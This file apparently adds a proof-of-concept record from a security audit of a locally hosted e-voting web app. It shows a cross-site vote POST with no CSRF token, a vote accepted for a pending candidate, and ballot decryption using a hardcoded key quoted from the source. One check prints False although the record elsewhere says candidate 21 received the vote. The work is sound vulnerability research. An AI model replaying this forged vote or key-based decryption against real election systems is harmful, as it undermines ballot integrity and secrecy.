@@ -1,0 +1,28 @@
+F7 POC: Secured E-Voting System ballot.php 投票无 CSRF 防护
+时间: 2026-11-09  目标: http://127.0.0.1:8138 (仅本地)
+会话: user_id=35 (otpbrute06@local.test)  选举 id=78880159
+
+== 漏洞要点 ==
+ballot.php:154 表单无 csrf_token 字段；:38-113 cast_vote 处理无任何 token 校验
+（login/otp_verify/Admin 表单都有 CSRF，唯独投票动作没有）。
+攻击者页面可对已登录（has_voted=0）选民诱导投票：跨站 POST votes[<position>]=<candidate>。
+
+== 复现步骤与响应 ==
+[0] 基线
+    votes=6 has_voted=0 pending_candidate=21 approved_candidate=17
+[302] POST /election/ballot.php?id=78880159 votes[5]=21（无任何 csrf token）
+    Location=vote_success
+[0] 投票后 has_voted
+    value=1
+[0] (取证) votes 表最新密文
+    ct=Aze26ZT5Xj/XbGVrDRyFiQ==...
+[0] (取证) 用源码硬编码密钥 'ccc@@' 站外解密
+    明文='21'（== 投给 pending 候选人 id=21? False）
+[0] 竞态尝试 ×6：未命中（TOCTOU 窗口存在但未打中）
+    不作为独立声明，仅注记
+[NO-CSRF-CONFIRMED] VERDICT-F7
+    cast_vote 在无 token 下被处理（302→vote_success）
+[NO-VALIDATION-CONFIRMED] VERDICT-F8
+    pending 候选人 id=21 收到有效选票并计入解密计票
+[HARDCODED-KEY-CONFIRMED] VERDICT-F6
+    站外解密成功——选票保密性完全依赖随源码分发的 5 字符密钥
